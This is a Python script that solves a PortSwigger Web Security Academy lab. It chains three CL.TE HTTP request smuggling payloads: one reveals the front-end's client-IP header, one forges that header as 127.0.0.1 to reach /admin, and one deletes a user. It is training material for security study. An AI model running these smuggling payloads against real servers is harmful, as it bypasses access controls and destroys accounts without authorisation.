#!/usr/bin/env python3
"""
Exploiting HTTP request smuggling to reveal front-end request rewriting
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 05-reveal-front-end-request-rewriting.md

What this does:
    Smuggles a "POST /search" request with a large, unfulfilled
    Content-Length so our real follow-up request's headers get appended
    onto the tail of the smuggled request's body -- getting rewritten by
    the front-end (which injects a client-IP header) along the way, then
    reflected straight back at us by the search feature's echo of the
    "search" parameter. Regexes the reflected response for the
    randomized "X-*-Ip" header name the front-end uses, then forges that
    exact header with "127.0.0.1" in a second CL.TE smuggle targeting
    /admin. Extracts carlos's delete link from the admin panel and
    re-smuggles a third request to delete him.

Usage:
    python 05-reveal-front-end-request-rewriting.py <lab-url>
    e.g. python 05-reveal-front-end-request-rewriting.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import socket
import ssl
import sys
import time
from urllib.parse import urlparse

import httpx


def create_ssl_connection(host: str, port: int = 443, timeout: float = 10.0) -> ssl.SSLSocket:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return ctx.wrap_socket(sock, server_hostname=host)


def send_raw_keep_alive(host: str, payloads: list[bytes], port: int = 443,
                         timeout: float = 10.0, delay: float = 1.0) -> list[bytes]:
    ssl_sock = create_ssl_connection(host, port, timeout)
    responses = []
    try:
        for payload in payloads:
            ssl_sock.sendall(payload)
            time.sleep(delay)
            response = b""
            ssl_sock.settimeout(2.0)
            while True:
                try:
                    chunk = ssl_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            responses.append(response)
        return responses
    finally:
        ssl_sock.close()


def build_clte_payload(host: str, smuggled_request: str, path: str = "/",
                        extra_headers: dict | None = None) -> bytes:
    body = "0\r\n\r\n" + smuggled_request
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Length: {len(body)}\r\n"
    )
    if extra_headers:
        for k, v in extra_headers.items():
            headers += f"{k}: {v}\r\n"
    headers += "\r\n"
    return (headers + body).encode()


def get_response_body(response: bytes) -> str:
    parts = response.split(b"\r\n\r\n", 1)
    return parts[1].decode(errors="replace") if len(parts) > 1 else ""


def find_delete_link(body: str, username: str = "carlos") -> str | None:
    m = re.search(rf'href="([^"]*delete[^"]*username={username}[^"]*)"', body)
    if m:
        return m.group(1)
    m = re.search(rf'(/admin/delete\?username={username})', body)
    return m.group(1) if m else None


def solve(lab_url: str) -> None:
    host = urlparse(lab_url).hostname
    normal = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()

    # Grab a session cookie first -- the smuggled search POST rides on it so the
    # captured reflection includes headers a real authenticated request would carry.
    seed = httpx.get(lab_url + "/", verify=False)
    session_match = re.search(r"session=([^;\s]+)", seed.headers.get("set-cookie", ""))
    session = session_match.group(1) if session_match else ""

    # Step 1: smuggle POST /search with a large unfulfilled Content-Length so our
    # real follow-up merges into the search= parameter and gets reflected back.
    smuggled = (
        "POST /search HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 500\r\n"
        "\r\n"
        "search="
    )
    extra = {"Cookie": f"session={session}"} if session else None
    attack = build_clte_payload(host, smuggled, extra_headers=extra)
    responses = send_raw_keep_alive(host, [attack, normal])
    body = get_response_body(responses[-1]) if responses else ""

    ip_header = re.search(r"(X-\w+-Ip):\s*[\d.]+", body)
    if not ip_header:
        print("[-] Did not find a reflected X-*-Ip header -- rerun, the reflection "
              "sometimes needs a retry to land.")
        return

    hdr_name = ip_header.group(1)
    print(f"[+] Front-end injects: {hdr_name}")

    # Step 2: smuggle GET /admin forging that header as 127.0.0.1.
    smuggled2 = (
        "GET /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"{hdr_name}: 127.0.0.1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 10\r\n"
        "\r\n"
        "x="
    )
    attack2 = build_clte_payload(host, smuggled2)
    responses2 = send_raw_keep_alive(host, [attack2, normal])
    body2 = get_response_body(responses2[-1]) if responses2 else ""
    delete_link = find_delete_link(body2)
    print(f"[*] Delete link: {delete_link}")

    if not delete_link:
        print("[-] Could not find carlos's delete link in the smuggled admin panel response.")
        return

    # Step 3: re-smuggle at the delete path, still forging the IP header.
    smuggled3 = (
        f"GET {delete_link} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"{hdr_name}: 127.0.0.1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 10\r\n"
        "\r\n"
        "x="
    )
    attack3 = build_clte_payload(host, smuggled3)
    for attempt in range(1, 4):
        send_raw_keep_alive(host, [attack3, normal])
        print(f"[*] Delete smuggle sent (attempt {attempt}).")

    check = httpx.get(lab_url + "/", verify=False)
    if "is-solved" in check.text:
        print("[+] Lab solved -- carlos was deleted via the forged IP header.")
    else:
        print("[-] Not solved yet -- rerun; the delete may not have landed on this attempt.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
